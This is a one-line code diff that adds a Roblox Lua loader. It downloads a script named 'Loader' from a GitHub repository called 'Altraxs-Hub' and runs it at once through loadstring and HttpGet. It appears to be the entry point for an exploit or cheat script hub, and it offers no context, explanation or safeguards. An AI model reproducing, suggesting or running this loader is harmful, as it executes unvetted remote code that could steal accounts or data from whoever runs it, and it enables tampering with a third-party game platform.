@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Altraxs-Hub/main/Loader"))()
